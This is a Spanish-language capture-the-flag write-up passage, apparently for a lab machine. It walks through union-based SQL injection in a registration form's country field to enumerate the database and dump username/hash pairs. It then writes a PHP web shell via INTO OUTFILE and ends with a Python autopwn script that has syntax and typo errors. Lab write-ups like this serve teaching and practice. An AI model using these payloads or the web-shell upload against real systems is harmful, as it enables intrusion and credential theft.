## Vulnerability Assessment {-}

### Analysando SQLI con Burpsuite {-}

Intentamos cambiar el pays.

```bash
username=admin&country=Brazil'-- -
username=admin&country=Brazil' union select 1-- -
username=admin&country=Brazil' union select database()-- -
username=admin&country=Brazil' union select version()-- -
```

Aqui la web nos muestra un 1 que significa que es vulnerable a SQLI.

Miramos las bases de datos existentes

```bash
username=admin&country=Brazil' union select schema_name from information_schema.schemata-- -
```

vemos que hay:
- information_schema
- performance_schema
- mysql
- registration

Miramos las tablas existentes en registration

```bash
username=caa&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- -
```

Vemos que solo hay una tabla registration.

Enumeramos las columnas

```bash
username=caa&country=Brazil' union select column_name from informaction_shema.columns where table_schema="registration" and table_name="registration"-- -
```

Vemos las columnas:
- username
- userhash
- country
- regtime

Con group_concat enumeramos lo que hay en esta tabla

```bash
username=caa&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -
```

Aqui vemos 
-admin:212321297a57a5a743894a0e4a801fc3
-caa:f931822fed1932e33450b91305a0c3d

Pero son usuarios que hemos creado nosotros.

#### Depositar ficheros con SQLI {-}

```bash
username=admin&country=Brazil' union select "probando" into outfile /var/www/html/prueba.txt-- -
```

Si vamos con firefox a la url `http://10.10.11.116/prueba.txt` podemos ver prueba. Intentamos subir un fichero php

```bash
username=admin&country=Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/s4vishell.php-- -
```

Si vamos a la url `http://10.10.11.116/s4vishell.php?cmd=whoami` vemos que podemos ejecutar comandos.

### Creamos un autopwn en python {-}

```python
#!/usr/bin/python

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SINGINT, def_handler)

if len(sys.argv != 3:
    log.failure("Uso: %s <ip-address> filename" % sys.argv[0]
    sys.exit(1)

#Variables globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address

def createFile():

    data_post = {
        'username': 'caa',
        'country': """Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/%s-- -""" % (filename)
    }

    r = requests.post(main_url, data=data_post)

if __name__ == '__main__':
    createFile()

```